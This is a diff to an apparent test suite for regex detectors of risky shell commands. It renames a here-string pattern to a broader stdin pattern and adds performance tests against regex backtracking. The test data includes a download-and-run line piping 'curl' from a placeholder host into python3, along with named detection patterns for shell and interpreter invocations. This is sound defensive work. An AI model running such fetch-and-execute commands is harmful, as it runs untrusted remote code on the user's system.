@@ -129,7 +129,7 @@ _OTHER_BASH_EXTRACTION_REGEXES = [
     # PROGRAM body -- the literal after each is read by hand, never by a
     # regex, so these carry no literal capture to backtrack into.
     ("interp_pipe", _bash_patterns._INTERP_PIPE_RE),
-    ("shell_herestring", _bash_patterns._SHELL_HERESTRING_RE),
+    ("shell_stdin", _bash_patterns._SHELL_STDIN_RE),
     ("awk_head", _bash_patterns._AWK_HEAD_RE),
     ("sed_head", _bash_patterns._SED_HEAD_RE),
     ("git_head", _bash_patterns._GIT_HEAD_RE),
@@ -999,9 +999,15 @@ _C52_BASH_ROWS = [
     # another case are `test_posix_shell_switch_value_is_never_a_head_spelling`,
     # and the one-head switch-run floods are
     # `test_posix_shell_switch_run_linear_on_one_head`
-    ("shell_herestring_repeated_head", _bash_patterns._SHELL_HERESTRING_RE, "sh -c"),
-    ("shell_herestring_switches", _bash_patterns._SHELL_HERESTRING_RE, "bash --norc -x"),
-    ("shell_herestring_opener", _bash_patterns._SHELL_HERESTRING_RE, "bash <<<"),
+    ("shell_stdin_repeated_head", _bash_patterns._SHELL_STDIN_RE, "sh -c"),
+    ("shell_stdin_switches", _bash_patterns._SHELL_STDIN_RE, "bash --norc -x"),
+    ("shell_stdin_opener", _bash_patterns._SHELL_STDIN_RE, "bash <<<"),
+    # DEF-3103: the opener ends at a heredoc's `<<` too, after an optional
+    # `-` or `--` that ends the options: a repeated head behind each, and a
+    # repeated heredoc opener
+    ("shell_stdin_end_of_options", _bash_patterns._SHELL_STDIN_RE, "bash -x --"),
+    ("shell_stdin_dash_operand", _bash_patterns._SHELL_STDIN_RE, "sh -"),
+    ("shell_stdin_heredoc_opener", _bash_patterns._SHELL_STDIN_RE, "bash <<"),
 ]
 _C52_PS_ROWS = [
     ("ps_rename", _bash_patterns._PS_RENAME_RE, "Rename-Item"),
@@ -3262,7 +3268,7 @@ def test_posix_shell_switch_run_linear_on_one_head(label, seed, tail):
     t = time.time()
     try:
         _bash_patterns._SHELL_DASH_C_RE.findall(payload)
-        _bash_patterns._SHELL_HERESTRING_RE.findall(payload)
+        _bash_patterns._SHELL_STDIN_RE.findall(payload)
         _bash_patterns._PS_BASH_DASH_C_RE.findall(payload)
         # DEF-3072: the wall's pipe reader behind a pipe lead, and the two
         # bump arms that read a shell's switches
@@ -3301,8 +3307,8 @@ _OUTPUT_REDIRECT_ROWS = [
     ("blank-led-digits", "bp", "_INTERP_PIPE_RE", _redirect_flood(" 1", "x | bash >", "<")),
     ("heredoc-redirect-run", "bp", "_INTERP_STDIN_RE", _redirect_flood(">o 2>&1 ", "python3 - ", "x")),
     ("heredoc-blank-targets", "bp", "_INTERP_STDIN_RE", _redirect_flood(">  ", "python3 ", "x")),
-    ("herestring-switches-then-run", "bp", "_SHELL_HERESTRING_RE", _redirect_flood("-o 1 ", "bash ", "2>&1 x")),
-    ("herestring-redirect-run", "bp", "_SHELL_HERESTRING_RE", _redirect_flood(">o 2>&1 ", "bash ", "x")),
+    ("herestring-switches-then-run", "bp", "_SHELL_STDIN_RE", _redirect_flood("-o 1 ", "bash ", "2>&1 x")),
+    ("herestring-redirect-run", "bp", "_SHELL_STDIN_RE", _redirect_flood(">o 2>&1 ", "bash ", "x")),
     ("fetch-scripter-run", "sb", "_FETCH_EXEC_PIPE_RE",
      _redirect_flood(">o 2>&1 ", "curl https://e.invalid/i | python3 ", "x")),
     ("fetch-scripter-blank-digits", "sb", "_FETCH_EXEC_PIPE_RE",
@@ -3369,7 +3375,7 @@ _SWITCH_REDIRECT_ROWS = [
     # the sites the census below found with no row of their own (the
     # failure-mode review): the here-string reader, the process-substitution
     # arm, and the -e openers that share Node's tail
-    ("herestring-dash-targets", "bp", "_SHELL_HERESTRING_RE", _redirect_flood("> -x ", "bash ", "x")),
+    ("herestring-dash-targets", "bp", "_SHELL_STDIN_RE", _redirect_flood("> -x ", "bash ", "x")),
     ("procsub-arm-redirects", "sb", "_FETCH_EXEC_PROCSUB_RE", _redirect_flood("2>/dev/null ", "bash ", "x")),
     ("ruby-after-e-dash-targets", "bp", "_RUBY_DASH_E_RE", _redirect_flood("> -x ", "ruby -e ", "<")),
     ("perl-after-e-dash-targets", "bp", "_PERL_DASH_E_RE", _redirect_flood("> -x ", "perl -e ", "<")),
@@ -3472,7 +3478,7 @@ def test_posix_shell_switch_value_is_never_a_head_spelling(label, verb):
     payload = (verb + " ") * (_HEAD_SPELLING_FLOOD_LEN // (len(verb) + 1))
     # the bump's substitution arm composes the same run (DEF-3072), linear
     # only while its shell heads stay a subset of the run's refused spellings
-    for pattern in (_bash_patterns._SHELL_DASH_C_RE, _bash_patterns._SHELL_HERESTRING_RE,
+    for pattern in (_bash_patterns._SHELL_DASH_C_RE, _bash_patterns._SHELL_STDIN_RE,
                     _speedbump._FETCH_EXEC_SUBST_RE):
         signal.signal(signal.SIGALRM, _alarm)
         signal.setitimer(signal.ITIMER_REAL, _CI_SAFE_BUDGET_MS / 1000.0)
